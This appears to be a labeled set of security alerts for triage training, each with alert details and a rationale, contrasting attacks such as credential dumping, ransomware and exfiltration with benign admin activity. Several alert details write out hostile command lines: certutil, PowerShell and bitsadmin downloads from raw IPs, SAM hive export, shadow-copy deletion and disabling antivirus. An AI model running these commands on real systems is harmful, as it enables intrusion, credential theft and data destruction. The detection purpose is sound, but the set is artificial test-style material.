alert.title: Multiple failed sign-ins followed by success
alert.details: 47 failed sign-ins for mlopez from 203.0.113.45 in 6 minutes, then 1 successful sign-in. Source IP not previously seen for this user.

label.rationale: Burst of failures then a success from an unknown IP suggests the password was guessed.

alert.title: Failed sign-ins across many accounts
alert.details: Failed sign-ins for 120 different accounts from 198.51.100.23 over 30 minutes, 1-2 attempts per account, no successes.

label.rationale: Password spraying pattern. No success yet, so containment is blocking the source and watching for success.

alert.title: User-reported suspicious email
alert.details: Email from it-support@c0mpany-helpdesk.example (lookalike domain, registered 2 days ago), SPF fail, link to a login page on an unrelated domain. 3 recipients, 1 click recorded, no credentials entered per proxy logs.

label.rationale: Failed authentication and lookalike domain. A click occurred but no credentials were entered.

alert.title: Credentials posted to suspected phishing page
alert.details: User tnguyen submitted a form with username and password to a fake Microsoft sign-in page on login-m365-verify.example. Password has not been reset.

label.rationale: Credentials were entered on a phishing page. The account must be treated as compromised.

alert.title: Office application spawned PowerShell
alert.details: winword.exe launched powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcA... (long base64 string). Parent document opened from an email attachment.

label.rationale: Office parent process plus hidden window and encoded command is classic malicious macro execution.

alert.title: Script downloads and runs executable
alert.details: wscript.exe from the Downloads folder launched cmd.exe /c certutil -urlcache -f http://203.0.113.77/a.exe C:\Users\Public\a.exe && C:\Users\Public\a.exe

label.rationale: A script downloaded a payload from an external IP and executed it immediately.

alert.title: LSASS memory access by unsigned tool
alert.details: Unsigned procdump64.exe run from C:\Users\Public opened lsass.exe with full access. File lsass.dmp created in the same folder. Host is a file server.

label.rationale: Credential dump on a server may expose many accounts. Immediate isolation and credential reset needed.

alert.title: Registry hive export
alert.details: reg save HKLM\SAM and HKLM\SYSTEM to C:\Temp by user helpdesk2 at 01:12. The account does not normally perform admin work.

label.rationale: Exporting SAM and SYSTEM hives is a credential access technique, done off-hours by an unexpected account.

alert.title: Shadow copies deleted then mass file rename
alert.details: vssadmin delete shadows /all /quiet executed by powershell.exe, followed by 2,300 files renamed with the .locked extension in 4 minutes.

label.rationale: Backup deletion plus mass renames means active ransomware encryption.

alert.title: Ransom note files created
alert.details: File README_RESTORE.txt created in 40 folders on a shared drive within 3 minutes. Users report documents cannot be opened.

label.rationale: Ransom notes across shares with inaccessible documents confirm ransomware.

alert.title: Suspicious scheduled task created
alert.details: schtasks /create /tn WindowsUpdateCheck /tr C:\Users\Public\upd.exe /sc onlogon /ru SYSTEM created from a standard user session. upd.exe is unsigned.

label.rationale: Task mimics a Windows name but runs an unsigned binary from a user-writable folder as SYSTEM.

alert.title: New autostart registry entry
alert.details: New value OneDriveSync under HKCU\Software\Microsoft\Windows\CurrentVersion\Run = powershell -w hidden -file C:\Users\Public\s.ps1, created by winword.exe.

label.rationale: Persistence set by an Office process and pointing to a hidden script in a public folder.

alert.title: Real-time protection disabled
alert.details: Set-MpPreference -DisableRealtimeMonitoring $true executed from a script by a standard user. No change ticket.

label.rationale: Disabling real-time protection by a non-admin script is defense evasion.

alert.title: Antivirus exclusion for entire drive
alert.details: An exclusion for C:\ was added to the antivirus policy on this host by user tmiller. No ticket and no other suspicious activity seen.

label.rationale: Excluding a whole drive is unjustified without a ticket. No other signs yet, so medium.

alert.title: PowerShell download then execution
alert.details: powershell.exe Invoke-WebRequest to http://198.51.100.9/tool.exe saved to C:\ProgramData\tool.exe, executed 8 seconds later.

label.rationale: Download and execute from a raw IP address by a script is payload delivery.

alert.title: RDP logon to domain controller
alert.details: Logon type 10 to SRV-DC01 from WKS-031 by standard user kpatel at 02:14. First time this user has accessed this server.

label.rationale: A standard user reaching a domain controller by RDP at night from a workstation is unusual and risky.

alert.title: One account logging in to many hosts
alert.details: svc-backup authenticated over SMB to 25 hosts within 10 minutes, all from workstation WKS-022. This service account normally logs in from the backup server only.

label.rationale: Fan-out from an unusual source host suggests the account is being used for lateral movement.

alert.title: Internal port scan
alert.details: WKS-044 connected to 254 IPs on port 445 within 90 seconds. Process nmap.exe was launched from the user's Downloads folder.

label.rationale: A user workstation running a scanner is discovery activity. No follow-up exploitation seen yet.

alert.title: Security event log cleared
alert.details: Event ID 1102 (audit log cleared) on SRV-APP03 by admin_tmp at 03:05. No change ticket.

label.rationale: Unexplained log clearing is typically done to hide activity.

alert.title: Impossible travel with MFA fatigue
alert.details: Sign-in for rjones from Lagos 3 minutes after a sign-in from Orlando. MFA was approved after 9 prompts in 4 minutes. User did not report any travel.

label.rationale: Impossible travel plus MFA fatigue indicates an account takeover.

alert.title: New inbox forwarding rule
alert.details: After a sign-in from an unfamiliar IP, an inbox rule was created forwarding all mail to an external address (cwood.archive@mailbox-free.example).

label.rationale: External forwarding created after an unfamiliar login is common in mailbox compromise.

alert.title: Large upload to unknown file-sharing service
alert.details: FS-01 uploaded 14 GB to filedrop.example.net at 01:30. rclone.exe observed running on the host.

label.rationale: Large night-time transfer to an unapproved service with rclone suggests data theft.

alert.title: Data staged and sent out
alert.details: 7z.exe created a 3.2 GB archive in C:\Temp from the HR share, followed by outbound HTTPS to 198.51.100.60 (no prior history).

label.rationale: Staging sensitive data into an archive then sending it to a new destination is exfiltration.

alert.title: Malware blocked on download
alert.details: EDR blocked and quarantined a file detected as Trojan.GenericKD immediately after browser download. File did not execute. No other activity.

label.rationale: Real malware, but blocked before running. Low severity with a check for other hosts.

alert.title: Malware executed with persistence and callbacks
alert.details: EDR detected loader behavior: process executed, new Run key added, outbound connections to 203.0.113.99 every 60 seconds.

label.rationale: Executed malware with persistence and beaconing is an active infection.

alert.title: Brute force on internet-facing RDP then success
alert.details: 900 failed logons from 198.51.100.200 against SRV-WEB01 (RDP exposed to the internet), followed by a successful logon as administrator.

label.rationale: A successful admin login after brute force on an exposed server is a likely full compromise.

alert.title: Macro document spawned command shell
alert.details: User opened invoice.docm from an external sender. winword.exe then launched cmd.exe running a download command.

label.rationale: Malicious attachment executed commands via macro.

alert.title: Security agent stopped and uninstall attempted
alert.details: The EDR agent service was stopped and an uninstall attempted on SRV-DB02 through a remote session by svc-sql.

label.rationale: Attempt to remove the EDR agent over a remote session, often a step before ransomware.

alert.title: Script host runs email-delivered JavaScript
alert.details: wscript.exe ran invoice.js launched from the email client, then made a connection to a rarely seen domain.

label.rationale: Script delivered by email with an outbound connection is likely a downloader.

alert.title: BITS job downloads DLL
alert.details: bitsadmin /transfer downloaded update.dll from 203.0.113.150 to %TEMP%. The DLL has not yet been loaded.

label.rationale: Download of a DLL from an unknown IP with a built-in tool. Not yet executed.

alert.title: New service created remotely
alert.details: New service WinSvcHost pointing to C:\Users\Public\svc.exe created on WKS-019 through a remote admin session from WKS-022.

label.rationale: A remotely created service pointing to a user-writable path is persistence and lateral movement.

alert.title: Dormant account sign-in
alert.details: Account former.employee, inactive for 214 days, signed in through VPN and accessed a file share.

label.rationale: Dormant accounts reactivating is suspicious. Medium until the account owner status is confirmed.

alert.title: Encoded PowerShell from management agent
alert.details: powershell.exe -enc ... launched by the RMM agent (signed binary in Program Files) on 60 hosts at 02:00. Matches maintenance window ticket CHG-1042.

label.rationale: Known RMM tool, signed binary, expected window and ticket, same pattern across hosts.

alert.title: Repeated failed sign-ins
alert.details: 12 failed sign-ins for asmith from her usual laptop at steady 5-minute intervals after her password changed yesterday. Mobile mail app retrying with the old password.

label.rationale: Known device, steady rhythm, recent password change. A stale saved credential.

alert.title: Network scan from internal host
alert.details: scanner-01 (10.0.5.10, approved vulnerability scanner) probed 500 hosts on ports 1-1024 during the scheduled Sunday 01:00 scan.

label.rationale: Approved scanner from a known host on its schedule.

alert.title: LSASS memory read by security software
alert.details: A signed endpoint security agent binary from its standard install path read lsass.exe memory during a scheduled scan.

label.rationale: Signed, expected product behavior from a known path.

alert.title: Mass agent offline alerts
alert.details: 500 endpoint agents reported offline at 14:02 and reconnected between 15:00 and 15:10. The cloud provider status page reports an incident in the region.

label.rationale: Uniform drop and recovery across many hosts matching a vendor outage, not an attack.

alert.title: RDP to many servers
alert.details: tech_rivera connected by RDP from admin workstation ADM-01 to 20 servers within 2 hours during the approved patch window, ticket CHG-1050.

label.rationale: Known admin, known source, approved change and window.

alert.title: New scheduled task from installer
alert.details: Scheduled task ContosoUpdate created by the installer of an approved software package, running a signed binary from Program Files.

label.rationale: Standard installer behavior with a signed binary in a normal path.

alert.title: Sign-in from a new country
alert.details: dlee signed in from Berlin using their usual device and completed MFA themselves. HR travel record shows a business trip this week.

label.rationale: Travel confirmed by records, same device, user completed MFA.
